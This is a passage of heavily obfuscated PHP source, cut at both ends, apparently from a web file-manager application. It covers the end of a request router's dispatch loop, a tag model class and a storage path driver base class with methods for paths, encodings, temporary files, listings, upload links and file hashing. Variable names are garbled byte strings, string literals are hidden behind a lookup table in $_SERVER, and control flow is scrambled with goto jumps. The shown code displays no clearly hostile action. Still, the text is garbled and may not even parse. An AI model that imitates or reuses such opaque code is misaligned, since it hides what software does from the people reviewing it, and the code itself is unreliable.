(strpos($aé’±î²¦µ, $dÏƒé©øÒ[4]) !== !1) { $aé’±î²¦µ = str_replace($eÂˆÙŒìµä, $DíÖã¾Ùç¾, $aé’±î²¦µ); } if (preg_match($dÏƒé©øÒ[1504] . $aé’±î²¦µ . $dÏƒé©øÒ[1505], $dêÕéŒÏŸì, $fÎÁòä‡‹§)) { if (self::$methods[$AéØêÁÎ‘] == $b°Àˆ¿¸¤• || self::$methods[$AéØêÁÎ‘] == $dÏƒé©øÒ[1502] || !empty(self::$maps[$AéØêÁÎ‘]) && in_array($b°Àˆ¿¸¤•, self::$maps[$AéØêÁÎ‘])) { $d³Çøñ”å° = !0; array_shift($fÎÁòä‡‹§); if (!is_object(self::$callbacks[$AéØêÁÎ‘])) { $c°ËÖÒô…„ = explode($dÏƒé©øÒ[8], self::$callbacks[$AéØêÁÎ‘]); $f‰éÚ¸— = end($c°ËÖÒô…„); $bÀ§¦ß¡‘¶ = explode($dÏƒé©øÒ[1503], $f‰éÚ¸—); $a¤»–í÷ñ = new $bÀ§¦ß¡‘¶[0](); if (!method_exists($a¤»–í÷ñ, $bÀ§¦ß¡‘¶[1])) { echo $dÏƒé©øÒ[1506]; } else { call_user_func_array(array($a¤»–í÷ñ, $bÀ§¦ß¡‘¶[1]), $fÎÁòä‡‹§); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$AéØêÁÎ‘], $fÎÁòä‡‹§); if (self::$halts) { return; } } } } $AéØêÁÎ‘++; } } if ($d³Çøñ”å° == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $D¥™ôËö‘» =& $_SERVER[œÕÊİğö]; header($_SERVER[$D¥™ôËö‘»[1507]] . $D¥™ôËö‘»[1508]); echo $D¥™ôËö‘»[1509]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$dÏƒé©øÒ[1501]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto Cïª¼æ³ñ; a‰‹Šé÷§¹: $eÂˆÙŒìµä = array_keys(static::$patterns); $DíÖã¾Ùç¾ = array_values(static::$patterns); $d³Çøñ”å° = !1; goto AŠÉ•Û Õ; Cïª¼æ³ñ: } } goto bÔù¿éÌÀ; aÍ¡Ï¶£ô»: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\x2e\x74\x61\147\x4c\x69\x73\x74"; public $modelType = "\125\x73\145\162\x4f\x70\164\x69\x6f\156"; public $field = array("\x6e\x61\x6d\x65", "\x73\x74\x79\154\145", "\163\157\x72\164"); public function listData($aÇ¢®¦çÓ = false, $cõÜ¹¹¨í = "\163\157\x72\x74", $f…ŞÚ—…¢ô = false) { return parent::listData($aÇ¢®¦çÓ, $cõÜ¹¹¨í, $f…ŞÚ—…¢ô); } public function remove($a×Ù†ò÷Úœ) { return parent::remove($a×Ù†ò÷Úœ); } public function add($e—Ï‘¨ê“, $e¸º‘‹ áí = "\154\141\x62\x65\x6c\x2d\x67\162\x65\171\55\156\x6f\x72\x6d\141\154") { $AæáÊæĞ¨ =& $_SERVER[œÕÊİğö]; if ($this->findByName($e—Ï‘¨ê“)) { return !1; } $bÌ„¬Á‚Øí = array($AæáÊæĞ¨[424] => $e—Ï‘¨ê“, $AæáÊæĞ¨[487] => $e¸º‘‹ áí, $AæáÊæĞ¨[1724] => $this->getSort($AæáÊæĞ¨[266]) + 1); return parent::insert($bÌ„¬Á‚Øí); } public function update($bª’…éï†Ö, $eÛ¦ÀÄ»ƒ) { $C‰•ÈÂÔÀ¬ =& $_SERVER[œÕÊİğö]; $eå½ŒŞÃ– = $this->listData($bª’…éï†Ö); $eŞ’Æê² = $this->findByName($eÛ¦ÀÄ»ƒ[$C‰•ÈÂÔÀ¬[38]]); if (!$eå½ŒŞÃ– || $eŞ’Æê² && $eŞ’Æê²[$C‰•ÈÂÔÀ¬[404]] != $eå½ŒŞÃ–[$C‰•ÈÂÔÀ¬[404]]) { return !1; } return parent::update($bª’…éï†Ö, $eÛ¦ÀÄ»ƒ); } public function moveTop($E›ÕŠ×‚™×) { $dß¡ŸËØÌ =& $_SERVER[œÕÊİğö]; $aÉ™Š‚¿á = parent::listData(); $f©ö©°ïÜÒ = $this->getSort($dß¡ŸËØÌ[265]); foreach ($aÉ™Š‚¿á as &$dØ¨á¢“¦Æ) { if ($dØ¨á¢“¦Æ[$dß¡ŸËØÌ[404]] == $E›ÕŠ×‚™×) { $dØ¨á¢“¦Æ[$dß¡ŸËØÌ[1743]] = $f©ö©°ïÜÒ; continue; } $dØ¨á¢“¦Æ[$dß¡ŸËØÌ[1743]] += 1; } unset($dØ¨á¢“¦Æ); return parent::resetData($aÉ™Š‚¿á); } public function moveBottom($cÉóœÛ) { $BÍ’Ø‡°ßØ =& $_SERVER[œÕÊİğö]; $a°‹—¨ÖŠ½ = $this->getSort($BÍ’Ø‡°ßØ[266]) + 1; return parent::update($cÉóœÛ, array($BÍ’Ø‡°ßØ[1743] => $a°‹—¨ÖŠ½)); } public function resetSort($eğŠô¡Éœ”) { goto bõãëÃÌÏ¬; bõãëÃÌÏ¬: $AÓÇÃ»½Æ… =& $_SERVER[œÕÊİğö]; $eßÊ¼¥¯š = array(); $eğŠô¡Éœ” = is_array($eğŠô¡Éœ”) ? $eğŠô¡Éœ” : array(); goto FñÆÚÙÂ¨ê; FñÆÚÙÂ¨ê: for ($Aê””¢îµÃ = 0; $Aê””¢îµÃ < count($eğŠô¡Éœ”); $Aê””¢îµÃ++) { $eßÊ¼¥¯š[$eğŠô¡Éœ”[$Aê””¢îµÃ] . $AÓÇÃ»½Æ…[43]] = $Aê””¢îµÃ + 1; } $bÈ¿¨‚‚– = parent::listData(); foreach ($bÈ¿¨‚‚– as &$fÈÇªø³ÓÜ) { $b¥áöÚÄ˜ = $eßÊ¼¥¯š[$fÈÇªø³ÓÜ[$AÓÇÃ»½Æ…[404]]]; $fÈÇªø³ÓÜ[$AÓÇÃ»½Æ…[1743]] = $b¥áöÚÄ˜ ? $b¥áöÚÄ˜ : $fÈÇªø³ÓÜ[$AÓÇÃ»½Æ…[1743]]; } goto CÆ®ñ¨È½õ; CÆ®ñ¨È½õ: unset($fÈÇªø³ÓÜ); return parent::resetData($bÈ¿¨‚‚–); goto e„æƒ»›Ü’; e„æƒ»›Ü’: } private function getSort($b…ÅòæÑÍ¯) { $E…ë’ïå„– =& $_SERVER[œÕÊİğö]; $F³Éëñ„³ = parent::listData(); $A˜À·¿˜¨³ = array_to_keyvalue($F³Éëñ„³, $E…ë’ïå„–[43], $E…ë’ïå„–[1743]); if (!$A˜À·¿˜¨³) { $A˜À·¿˜¨³ = array(0); } $B²Öï¿ = $b…ÅòæÑÍ¯ == $E…ë’ïå„–[266] ? max($A˜À·¿˜¨³) : min($A˜À·¿˜¨³); return intval($B²Öï¿); } } goto bòÅÊÂãĞª; eÌàˆ±…¾…: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $eô‘…í²ÒÌ =& $_SERVER[œÕÊİğö]; $this->objectDriver = array($eô‘…í²ÒÌ[67], $eô‘…í²ÒÌ[68], $eô‘…í²ÒÌ[69], $eô‘…í²ÒÌ[70], $eô‘…í²ÒÌ[71], $eô‘…í²ÒÌ[72], $eô‘…í²ÒÌ[73], $eô‘…í²ÒÌ[74], $eô‘…í²ÒÌ[75]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($cšç‡À£Ô§) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($cšç‡À£Ô§, $_SERVER[œÕÊİğö][8]); } return $cšç‡À£Ô§; } public function iconvApp($c‚á”å”ã) { return $c‚á”å”ã; } public function iconvSystem($aª®õÏ‹éƒ) { return $aª®õÏ‹éƒ; } public function iconvTo($aÆ¼–ñàäø, $BêË¾ò¶¾, $a¿É‹İ‘Ñ‚) { goto d·¢õª©ù; C°‹£šÙã³: $BË£¤š©[$a¿É‹İ‘Ñ‚ . $f‚àí°†äÊ[77] . $BêË¾ò¶¾ . $f‚àí°†äÊ[78] . $aÆ¼–ñàäø] = $aÆ¼–ñàäø; $BË£¤š©[$a¿É‹İ‘Ñ‚ . $f‚àí°†äÊ[77] . $BêË¾ò¶¾ . $f‚àí°†äÊ[78] . $E®ŠğªÂ­] = $aÆ¼–ñàäø; $BË£¤š©[$BêË¾ò¶¾ . $f‚àí°†äÊ[77] . $a¿É‹İ‘Ñ‚ . $f‚àí°†äÊ[78] . $E®ŠğªÂ­] = $E®ŠğªÂ­; goto F­õ‹³„ÃÑ; bÀëÚìŠÏ: $EòàĞìÎ¾ = $BêË¾ò¶¾ . $f‚àí°†äÊ[77] . $a¿É‹İ‘Ñ‚ . $f‚àí°†äÊ[78] . $aÆ¼–ñàäø; if (isset($BË£¤š©[$EòàĞìÎ¾])) { return $BË£¤š©[$EòàĞìÎ¾]; } if (function_exists($f‚àí°†äÊ[79])) { $E®ŠğªÂ­ = @mb_convert_encoding($aÆ¼–ñàäø, $a¿É‹İ‘Ñ‚, $BêË¾ò¶¾); } else { $E®ŠğªÂ­ = @iconv($BêË¾ò¶¾, $a¿É‹İ‘Ñ‚, $aÆ¼–ñàäø); } goto aäê›Ì–ÓÚ; aäê›Ì–ÓÚ: $E®ŠğªÂ­ = $E®ŠğªÂ­ ? $E®ŠğªÂ­ : $aÆ¼–ñàäø; if (strstr($E®ŠğªÂ­, $f‚àí°†äÊ[80])) { $E®ŠğªÂ­ = str_replace($f‚àí°†äÊ[80], $f‚àí°†äÊ[81], $E®ŠğªÂ­); } $BË£¤š©[$BêË¾ò¶¾ . $f‚àí°†äÊ[77] . $a¿É‹İ‘Ñ‚ . $f‚àí°†äÊ[78] . $aÆ¼–ñàäø] = $E®ŠğªÂ­; goto C°‹£šÙã³; d·¢õª©ù: $f‚àí°†äÊ =& $_SERVER[œÕÊİğö]; if (!$aÆ¼–ñàäø || !function_exists($f‚àí°†äÊ[76])) { return $aÆ¼–ñàäø; } static $BË£¤š© = array(); goto bÀëÚìŠÏ; F­õ‹³„ÃÑ: return $E®ŠğªÂ­; goto A² Äİ…«Ÿ; A² Äİ…«Ÿ: } public function getPathInner($DÙì‡Ä×·«) { $eÂçÓ…’ = IO::init($DÙì‡Ä×·«); return $eÂçÓ…’->path; } public function getPathOuter($EĞ†Ó£à»”) { $bÒ‹ÖÓ– =& $_SERVER[œÕÊİğö]; $dæÂ©½ä¯¦ = strlen(trim($this->pathBase, $bÒ‹ÖÓ–[8])); $EĞ†Ó£à»” = substr(trim($EĞ†Ó£à»”, $bÒ‹ÖÓ–[8]), $dæÂ©½ä¯¦); return $this->pathDriver . $bÒ‹ÖÓ–[8] . ltrim($EĞ†Ó£à»”, $bÒ‹ÖÓ–[8]); } public function isParentOf($BÃ®ËéÔİ, $eË”®ƒÔ•©) { $BŸ¨Ôì®æ” =& $_SERVER[œÕÊİğö]; $BÃ®ËéÔİ = rtrim(strtolower($BÃ®ËéÔİ), $BŸ¨Ôì®æ”[8]) . $BŸ¨Ôì®æ”[8]; $eË”®ƒÔ•© = rtrim(strtolower($eË”®ƒÔ•©), $BŸ¨Ôì®æ”[8]) . $BŸ¨Ôì®æ”[8]; $C–ç—ÃÁ¤ = strpos($eË”®ƒÔ•©, $BÃ®ËéÔİ) === 0; return $C–ç—ÃÁ¤; } public function getType() { $aˆè„×åßƒ =& $_SERVER[œÕÊİğö]; $e’ºäå´äœ = str_replace($aˆè„×åßƒ[82], $aˆè„×åßƒ[43], get_class($this)); return strtolower($e’ºäå´äœ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($aÒ‰ˆ»›À‰, $A˜Ã‡ô‡©±) { $A”˜ïÙãğ =& $_SERVER[œÕÊİğö]; $E¨¿ßƒ¡Ó² = rtrim($aÒ‰ˆ»›À‰, $A”˜ïÙãğ[8]) . $A”˜ïÙãğ[8] . $A˜Ã‡ô‡©±; $fæÎÌÜ”éâ = $this->exist($E¨¿ßƒ¡Ó²); return $fæÎÌÜ”éâ ? $E¨¿ßƒ¡Ó² : !1; } public function setModifyTime($C¬“õ¹‹Á, $aƒ¾Ÿ©£¡á = '') { } public function renameObject($A÷Ş›•ôĞ¡, $dÇÖø‰Ô§¾) { goto cÃäÅù‰ÕĞ; Fô£«­‚ôí: $A÷Ş›•ôĞ¡ = $this->getPathOuter($A÷Ş›•ôĞ¡); $dÇÖø‰Ô§¾ = $this->pathFather($A÷Ş›•ôĞ¡) . $dÇÖø‰Ô§¾; if (IO::isFile($A÷Ş›•ôĞ¡)) { $c„‹íëŠÂó = IO::copy($A÷Ş›•ôĞ¡, $this->pathFather($A÷Ş›•ôĞ¡), REPEAT_RENAME_FOLDER, $fÒ™²—); if ($c„‹íëŠÂó) { IO::remove($A÷Ş›•ôĞ¡); } } else { $c„‹íëŠÂó = IO::mkdir($dÇÖø‰Ô§¾); if (!$c„‹íëŠÂó) { return !1; } $EÜ›¹¿×É = IO::listPath($A÷Ş›•ôĞ¡, !0); $C÷ç×Í¯Ê = array_merge($EÜ›¹¿×É[$F¸ñ„ âŸõ[84]], $EÜ›¹¿×É[$F¸ñ„ âŸõ[85]]); foreach ($C÷ç×Í¯Ê as $F•»¶¦Šç) { IO::move($F•»¶¦Šç[$F¸ñ„ âŸõ[86]], $dÇÖø‰Ô§¾, REPEAT_RENAME_FOLDER); } IO::remove($A÷Ş›•ôĞ¡); } goto f¹Î±ö¥‡Í; cÃäÅù‰ÕĞ: $F¸ñ„ âŸõ =& $_SERVER[œÕÊİğö]; $fÒ™²— = $dÇÖø‰Ô§¾; Hook::trigger($F¸ñ„ âŸõ[83], $this, $A÷Ş›•ôĞ¡, $this, $this->pathFather($A÷Ş›•ôĞ¡) . $dÇÖø‰Ô§¾); goto Fô£«­‚ôí; f¹Î±ö¥‡Í: return $c„‹íëŠÂó ? $dÇÖø‰Ô§¾ : !1; goto C¯¹÷»Ÿ; C¯¹÷»Ÿ: } public function tempFile($DÎ¤„¬á = '', $F–ƒ‘¶¢›Ì = '') { goto FĞäçîˆ«’; eä—õ˜õó: return $BÖ˜Õ±ò–; goto aÛñÑ†¤¦õ; FĞäçîˆ«’: if (!$DÎ¤„¬á) { $DÎ¤„¬á = rand_string(15); } $dóõÓÈÜ³· = TEMP_FILES . rand_string(15) . $_SERVER[œÕÊİğö][8]; @mkdir($dóõÓÈÜ³·, DEFAULT_PERRMISSIONS, !0); goto bª·ì«Àšô; bª·ì«Àšô: $BÖ˜Õ±ò– = $dóõÓÈÜ³· . $DÎ¤„¬á; @touch($BÖ˜Õ±ò–); if ($F–ƒ‘¶¢›Ì) { file_put_contents($BÖ˜Õ±ò–, $F–ƒ‘¶¢›Ì); } goto eä—õ˜õó; aÛñÑ†¤¦õ: } public function tempFileRemve($B‘ˆš¼ŒŠ˜) { @unlink($B‘ˆš¼ŒŠ˜); @rmdir($this->pathFather($B‘ˆš¼ŒŠ˜)); } public function mkfile($CŒã—¨ƒŠ©, $F¢ùî·ÄÏ = '', $E»¼¹ğÈÉÜ = REPEAT_RENAME) { } public function mkdir($böíø™¶®İ, $f„ğàÈÀæ£ = REPEAT_SKIP) { } public function delFile($d—Şš®¢©Ú) { } public function delFolder($FŒç¢·÷’) { } public function copyFile($d‡áßÔç, $e¢“Î¯ñ­ä) { } public function moveFile($F‘„Ùæ½, $fĞ¨Ê‰Ü) { } public function remove($d‹øÜÑç•ô) { if ($this->isFile($d‹øÜÑç•ô)) { return $this->delFile($d‹øÜÑç•ô); } return $this->delFolder($d‹øÜÑç•ô); } public function rename($D……÷‹, $B§ŠºÖ¬°Æ) { } public function exist($eŠÅ°™’¿’) { } public function findByHash($fø‹ŒÈÖÜ = '', $fŠ»Š¤¹Ï = '') { return !1; } public function isFile($f˜®‹ÇŠØ) { } public function isFolder($D£¥·¯Á) { } public function size($f‡Û‚¢µ—Ó) { } public function info($e‚Ëº‰Íæ¶) { } public function infoSimple($BŠ¯Ş›¶è) { return $this->info($BŠ¯Ş›¶è); } public function infoAuth($e¢­Ó‘•) { return $this->info($e¢­Ó‘•); } public function infoFull($aïò¯†æ¡…) { return $this->info($aïò¯†æ¡…); } public function infoWithChildren($EØî³¼ÔÒõ) { $e•÷Şé†µ =& $_SERVER[œÕÊİğö]; static $FŠÔ¡Â = array(); if (isset($FŠÔ¡Â[$EØî³¼ÔÒõ])) { return $FŠÔ¡Â[$EØî³¼ÔÒõ]; } $aäåŸ›ÅÏ = $this->info($EØî³¼ÔÒõ); if ($aäåŸ›ÅÏ && $aäåŸ›ÅÏ[$e•÷Şé†µ[39]] == $e•÷Şé†µ[87]) { $Fâù¾‚Â« = array($e•÷Şé†µ[88] => 0, $e•÷Şé†µ[89] => 0, $e•÷Şé†µ[90] => 0); $this->infoChildren($EØî³¼ÔÒõ, $Fâù¾‚Â«); $aäåŸ›ÅÏ[$e•÷Şé†µ[88]] = $Fâù¾‚Â«[$e•÷Şé†µ[88]]; $aäåŸ›ÅÏ[$e•÷Şé†µ[91]] = array($e•÷Şé†µ[92] => $Fâù¾‚Â«[$e•÷Şé†µ[89]], $e•÷Şé†µ[93] => $Fâù¾‚Â«[$e•÷Şé†µ[90]]); $FŠÔ¡Â[$EØî³¼ÔÒõ] = $aäåŸ›ÅÏ; } return $aäåŸ›ÅÏ; } public function listPath($DÀ“âå·Ó, $Câœ­¶Ë—ô = false) { } public function has($e½ÌµÙØ©Ë, $BİùÀ­Ò† = false, $D¼÷Ğ¡Üµ = false) { } public function canRead($Cè¬Ï¬¢Üß) { } public function canWrite($aô–†…Ş•á) { } public function getContent($AìÍŠ—âİ) { } public function setContent($cÜÄ¾½ßä¦, $e¸¨ß¼“·  = '') { } protected function infoChildren($F„ÆªÛ±‡, &$fšÜ±ßï˜‚) { $fŸÃ‹õÀ¾ =& $_SERVER[œÕÊİğö]; check_abort_echo(); $A·ë Ø­ÉŒ = $this->listPath($F„ÆªÛ±‡, !0); $A·ë Ø­ÉŒ = array_merge($A·ë Ø­ÉŒ[$fŸÃ‹õÀ¾[85]], $A·ë Ø­ÉŒ[$fŸÃ‹õÀ¾[84]]); foreach ($A·ë Ø­ÉŒ as $F”³ƒÕ„ã‘) { if ($F”³ƒÕ„ã‘[$fŸÃ‹õÀ¾[39]] == $fŸÃ‹õÀ¾[87]) { $fšÜ±ßï˜‚[$fŸÃ‹õÀ¾[90]]++; $f¼­‹åÑ«Á = $this->getPathInner($F”³ƒÕ„ã‘[$fŸÃ‹õÀ¾[86]]); $this->infoChildren($f¼­‹åÑ«Á, $fšÜ±ßï˜‚); } else { $fšÜ±ßï˜‚[$fŸÃ‹õÀ¾[89]]++; $fšÜ±ßï˜‚[$fŸÃ‹õÀ¾[88]] += $F”³ƒÕ„ã‘[$fŸÃ‹õÀ¾[88]]; } } } public function fileSubstr($a»¿¤¸‚¬, $CšÄ•¤æ„†, $B…¥ÑÇ‚µ´) { } public function listAll($dëé¹ù™ŸŞ) { } public function listAllMake($BÃê‹Æ¹Á, &$c‘Ò¼—‘Ëƒ) { $f›Šß÷„öÓ =& $_SERVER[œÕÊİğö]; check_abort_echo(); $Eµ³ÊÚöìª = $this->listPath($BÃê‹Æ¹Á, !0); if (!$Eµ³ÊÚöìª) { return; } $f‰áˆŞøğÀ = array_merge($Eµ³ÊÚöìª[$f›Šß÷„öÓ[85]], $Eµ³ÊÚöìª[$f›Šß÷„öÓ[84]]); foreach ($f‰áˆŞøğÀ as $B¥ˆëË•µã) { goto bÔÒÅ„î‰Ñ; DÊ†æôÔˆÈ: if (isset($B¥ˆëË•µã[$f›Šß÷„öÓ[94]])) { $dºåõš¨[$f›Šß÷„öÓ[94]] = $B¥ˆëË•µã[$f›Šß÷„öÓ[94]]; } if (!$CÚ¬ğÁ˜é”) { $c‘Ò¼—‘Ëƒ[] = $dºåõš¨; continue; } $c‘Ò¼—‘Ëƒ[] = $dºåõš¨; goto cˆ·‚¸ÇËŞ; cˆ·‚¸ÇËŞ: $this->listAllMake($B¥ˆëË•µã[$f›Šß÷„öÓ[86]], $c‘Ò¼—‘Ëƒ); goto e¼‚ÒãÉó; bÔÒÅ„î‰Ñ: $CÚ¬ğÁ˜é” = $B¥ˆëË•µã[$f›Šß÷„öÓ[39]] == $f›Šß÷„öÓ[87]; $dºåõš¨ = array($f›Šß÷„öÓ[86] => $B¥ˆëË•µã[$f›Šß÷„öÓ[86]], $f›Šß÷„öÓ[87] => $CÚ¬ğÁ˜é”); if (isset($B¥ˆëË•µã[$f›Šß÷„öÓ[88]])) { $dºåõš¨[$f›Šß÷„öÓ[88]] = $B¥ˆëË•µã[$f›Šß÷„öÓ[88]]; } goto DÊ†æôÔˆÈ; e¼‚ÒãÉó: } } public function listAllSimple($eªì¢ÕÖÏ‚) { $FØ‰ÆŠ¯ªÂ =& $_SERVER[œÕÊİğö]; $dÖ„ò¯¢®ñ = array(); $b›…À¦³ƒ‚ = $this->listAll($eªì¢ÕÖÏ‚); $F‡ÓµÏòìƒ = $this->getPathOuter($eªì¢ÕÖÏ‚); foreach ($b›…À¦³ƒ‚ as $DÀö…ò) { goto aªí™Õ²• ; e°áØ™ï …: $d´äÃ—Å•À = array($FØ‰ÆŠ¯ªÂ[86] => $dõ‚óÔËÜ, $FØ‰ÆŠ¯ªÂ[87] => $DÀö…ò[$FØ‰ÆŠ¯ªÂ[87]]); if (isset($DÀö…ò[$FØ‰ÆŠ¯ªÂ[88]]) && !$DÀö…ò[$FØ‰ÆŠ¯ªÂ[87]]) { $d´äÃ—Å•À[$FØ‰ÆŠ¯ªÂ[88]] = $DÀö…ò[$FØ‰ÆŠ¯ªÂ[88]]; } if (isset($DÀö…ò[$FØ‰ÆŠ¯ªÂ[94]])) { $d´äÃ—Å•À[$FØ‰ÆŠ¯ªÂ[94]] = $DÀö…ò[$FØ‰ÆŠ¯ªÂ[94]]; } goto Aµç§ãä; Aµç§ãä: if (!$DÀö…ò[$FØ‰ÆŠ¯ªÂ[87]]) { $d´äÃ—Å•À[$FØ‰ÆŠ¯ªÂ[96]] = $d‘½è ¾Ö; } $dÖ„ò¯¢®ñ[] = $d´äÃ—Å•À; goto d¿ÒçÍƒÒ; aªí™Õ²• : $d‘½è ¾Ö = $DÀö…ò[$FØ‰ÆŠ¯ªÂ[86]]; $dõ‚óÔËÜ = $DÀö…ò[$FØ‰ÆŠ¯ªÂ[86]]; if (isset($DÀö…ò[$FØ‰ÆŠ¯ªÂ[95]])) { $d‘½è ¾Ö = $DÀö…ò[$FØ‰ÆŠ¯ªÂ[95]][$FØ‰ÆŠ¯ªÂ[86]]; $DÀö…ò[$FØ‰ÆŠ¯ªÂ[88]] = $DÀö…ò[$FØ‰ÆŠ¯ªÂ[95]][$FØ‰ÆŠ¯ªÂ[88]]; $DÀö…ò[$FØ‰ÆŠ¯ªÂ[94]] = $DÀö…ò[$FØ‰ÆŠ¯ªÂ[95]][$FØ‰ÆŠ¯ªÂ[94]]; } else { $dõ‚óÔËÜ = substr($DÀö…ò[$FØ‰ÆŠ¯ªÂ[86]], strlen(get_path_father($F‡ÓµÏòìƒ))); $dõ‚óÔËÜ = $FØ‰ÆŠ¯ªÂ[8] . ltrim($dõ‚óÔËÜ, $FØ‰ÆŠ¯ªÂ[8]); } goto e°áØ™ï …; d¿ÒçÍƒÒ: } return $dÖ„ò¯¢®ñ; } public function upload($Føƒ—áÃ“, $AåòÄÉ—¤, $aîöªööïÊ = false, $F¹ó„Ê™Ññ = REPEAT_REPLACE) { } public function uploadFileByID($CİìĞ‘¬³§, $Eµñ‚àã·, $bõŒ¤ŞÓ) { } public function uploadFileByPath($eå¢®¸÷Ö¤, $Dã±ì©¶, $DÃİŸ¹»À› = array()) { } public function isUploadServer() { $eËå·§”ä¦ =& $_SERVER[œÕÊİğö]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $eËå·§”ä¦[97]) { return !0; } return $GLOBALS[$eËå·§”ä¦[6]][$eËå·§”ä¦[98]][$eËå·§”ä¦[99]]; } public function isFileOutServer() { $aÅĞÏğÌêÛ =& $_SERVER[œÕÊİğö]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $aÅĞÏğÌêÛ[97]) { return !0; } return $GLOBALS[$aÅĞÏğÌêÛ[6]][$aÅĞÏğÌêÛ[98]][$aÅĞÏğÌêÛ[100]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($C§×—ƒÈµ˜) { $EñÆâ™õÂÃ =& $_SERVER[œÕÊİğö]; if (!$this->isCdnHost()) { return $C§×—ƒÈµ˜; } return str_replace(trim(get_url_root($C§×—ƒÈµ˜), $EñÆâ™õÂÃ[8]), trim($this->cdnHost, $EñÆâ™õÂÃ[8]), $C§×—ƒÈµ˜); } public function uploadLink($aà£î®İ–ª, $aÎ²ÈêÀØ¶ = 0) { goto e½õôŞƒ; D »ö†µïÕ: $F¿½”»ˆó¸ = $aÎ²ÈêÀØ¶ <= $d¼Õ£¥ƒ¨ê ? $aÉÁ÷é¥ÇÛ[101] : $aÉÁ÷é¥ÇÛ[102]; $dòÓ£¬á‹ = (!$aÎ²ÈêÀØ¶ ? 1 : ceil($aÎ²ÈêÀØ¶ / pow(1024, 3))) * 3600 * 4; $e›Œ ğ÷Ö = $this->{$F¿½”»ˆó¸}($aà£î®İ–ª, $dòÓ£¬á‹); goto BÌĞñÊÙùÎ; BŠĞÁ ²ºñ: if (!in_array($CõéÏµÒÉ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $d¼Õ£¥ƒ¨ê = 1024 * 1024 * 10; goto D »ö†µïÕ; e½õôŞƒ: $aÉÁ÷é¥ÇÛ =& $_SERVER[œÕÊİğö]; if ($this->isUploadServer()) { return; } $CõéÏµÒÉ = $this->getType(); goto BŠĞÁ ²ºñ; BÌĞñÊÙùÎ: if ($e›Œ ğ÷Ö) { $e›Œ ğ÷Ö[$aÉÁ÷é¥ÇÛ[103]] = $aà£î®İ–ª; $e›Œ ğ÷Ö[$aÉÁ÷é¥ÇÛ[104]] = $CõéÏµÒÉ; } return $e›Œ ğ÷Ö; goto E×Ü¯·à÷ñ; E×Ü¯·à÷ñ: } public function uploadFormData($b™å˜†µ‹, $bÒˆõø°ÓÓ = 3600) { } public function multiUploadFormData($A¨„°øÃíÈ, $FÕÅ°›§Í§ = 3600) { } public function download($a»·¥î‘ºï, $eÅÉá‚é×) { } public function ext($còë®Ì°â) { $bí„‡âÍŠ =& $_SERVER[œÕÊİğö]; if (strpos($còë®Ì°â, $bí„‡âÍŠ[8]) === -1) { $E„’¬Š®“í = $còë®Ì°â; } else { $E„’¬Š®“í = $this->pathThis($còë®Ì°â); } $AßÎ†«»„¯ = $bí„‡âÍŠ[43]; if (strstr($E„’¬Š®“í, $bí„‡âÍŠ[105])) { $AßÎ†«»„¯ = substr($E„’¬Š®“í, strrpos($E„’¬Š®“í, $bí„‡âÍŠ[105]) + 1); $AßÎ†«»„¯ = strtolower($AßÎ†«»„¯); } if (strlen($AßÎ†«»„¯) > 3 && preg_match($bí„‡âÍŠ[106], $AßÎ†«»„¯, $cĞ»ë•« Ç)) { $AßÎ†«»„¯ = $bí„‡âÍŠ[43]; } return $AßÎ†«»„¯; } public function pathThis($aòñ¦àåŒ›) { $DĞ¶„²“ã­ =& $_SERVER[œÕÊİğö]; $aòñ¦àåŒ› = str_replace($DĞ¶„²“ã­[107], $DĞ¶„²“ã­[8], rtrim($aòñ¦àåŒ›, $DĞ¶„²“ã­[8])); $CÄäÑ´èß = strrpos($aòñ¦àåŒ›, $DĞ¶„²“ã­[8]); if ($CÄäÑ´èß === !1) { return $aòñ¦àåŒ›; } return substr($aòñ¦àåŒ›, $CÄäÑ´èß + 1); } public function pathFather($eå‡ Œ‹Ü) { $EˆÏ¯ëŒãğ =& $_SERVER[œÕÊİğö]; $eå‡ Œ‹Ü = str_replace($EˆÏ¯ëŒãğ[107], $EˆÏ¯ëŒãğ[8], rtrim($eå‡ Œ‹Ü, $EˆÏ¯ëŒãğ[8])); $d ¿§Ú ‘ = strrpos($eå‡ Œ‹Ü, $EˆÏ¯ëŒãğ[8]); if ($d ¿§Ú ‘ === !1) { return $EˆÏ¯ëŒãğ[43]; } return substr($eå‡ Œ‹Ü, 0, $d ¿§Ú ‘ + 1); } public function hashSimple($f²¢ØÙ¥½ ) { goto d„ì˜–äÕ; FñëÔßÃ®: $Fõ‹ì‰©”Î .= $this->fileSubstr($f²¢ØÙ¥½ , $A¯‹äÆÍ…á - $CÃ’˜¸¶Èí, $CÃ’˜¸¶Èí); return md5($Fõ‹ì‰©”Î) . $A¯‹äÆÍ…á; goto CäÍßæ‹‘Ì; cÅ‹”ÜÅ„ : $E¾†óÅ¤ì = intval($A¯‹äÆÍ…á / $cäçØœ•¸±); $Fõ‹ì‰©”Î = $D¥ èĞÉ[43]; for ($bêˆ“Éä¬ = 0; $bêˆ“Éä¬ < $cäçØœ•¸±; $bêˆ“Éä¬++) { $Fõ‹ì‰©”Î .= $this->fileSubstr($f²¢ØÙ¥½ , $E¾†óÅ¤ì * $bêˆ“Éä¬, $CÃ’˜¸¶Èí); } goto FñëÔßÃ®; FšË†„½ë: $CÃ’˜¸¶Èí = 200; $cäçØœ•¸± = 50; if ($A¯‹äÆÍ…á <= $CÃ’˜¸¶Èí * $cäçØœ•¸±) { return $this->hashMd5($f²¢ØÙ¥½ ) . $A¯‹äÆÍ…á; } goto cÅ‹”ÜÅ„ ; d„ì˜–äÕ: $D¥ èĞÉ =& $_SERVER[œÕÊİğö]; if (!$f²¢ØÙ¥½ ) { return md5($D¥ èĞÉ[43]); } $A¯‹äÆÍ…á = $this->size($f²¢ØÙ¥½ ); goto FšË†„½ë; 